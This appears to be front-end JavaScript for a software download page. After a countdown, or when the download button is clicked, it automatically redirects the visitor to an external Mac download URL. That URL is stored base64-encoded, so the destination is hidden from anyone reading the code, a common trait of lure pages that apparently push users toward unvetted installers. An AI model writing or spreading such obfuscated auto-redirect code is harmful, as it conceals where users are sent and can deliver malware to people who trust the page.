(function() {
  'use strict';

  const wrapper = document.querySelector('.page-wrapper');
  const delayMs = Math.max(0, Number(wrapper?.dataset?.delayMs || 4000));

  const elements = {
    countdown: document.getElementById('countdownTime'),
    seconds: document.getElementById('secondsText'),
    progressBar: document.getElementById('progressBar'),
    button: document.getElementById('downloadBtn')
  };

  const state = {
    startTime: performance.now(),
    isRedirecting: false,
    rafId: null
  };

  function clamp(value, min, max) {
    return Math.min(max, Math.max(min, value));
  }

  function decodeBase64(str) {
    try {
      return atob(str);
    } catch (e) {
      return str;
    }
  }

  function getRedirectUrl() {
    const encoded = 'aHR0cHM6Ly9wdXJlbWFjLndzL21hYy8=';
    const decoded = decodeBase64(encoded);
    if (decoded.startsWith('http://') || decoded.startsWith('https://')) {
      return decoded;
    }
    return '';
  }

  function animate(currentTime) {
    if (state.isRedirecting) return;

    const elapsed = currentTime - state.startTime;
    const progress = delayMs === 0 ? 1 : clamp(elapsed / delayMs, 0, 1);
    
    const remainingMs = Math.max(0, delayMs - elapsed);
    const remainingSec = Math.ceil(remainingMs / 1000);

    if (elements.countdown) {
      elements.countdown.textContent = `${remainingSec}s`;
    }
    if (elements.seconds) {
      elements.seconds.textContent = String(remainingSec);
    }
    if (elements.progressBar) {
      const percentage = Math.max(0, Math.round(progress * 100));
      elements.progressBar.style.width = `${percentage}%`;
    }

    if (elapsed >= delayMs) {
      performRedirect();
      return;
    }

    state.rafId = requestAnimationFrame(animate);
  }

  function performRedirect() {
    if (state.isRedirecting) return;
    state.isRedirecting = true;
    
    if (state.rafId) {
      cancelAnimationFrame(state.rafId);
    }

    const targetUrl = getRedirectUrl();
    if (targetUrl) {
      window.location.assign(targetUrl);
    }
  }

  if (elements.button) {
    elements.button.addEventListener('click', performRedirect);
  }

  state.rafId = requestAnimationFrame(animate);

  document.addEventListener('visibilitychange', function() {
    if (document.hidden && state.rafId) {
      cancelAnimationFrame(state.rafId);
    } else if (!document.hidden && !state.isRedirecting) {
      state.rafId = requestAnimationFrame(animate);
    }
  });
})();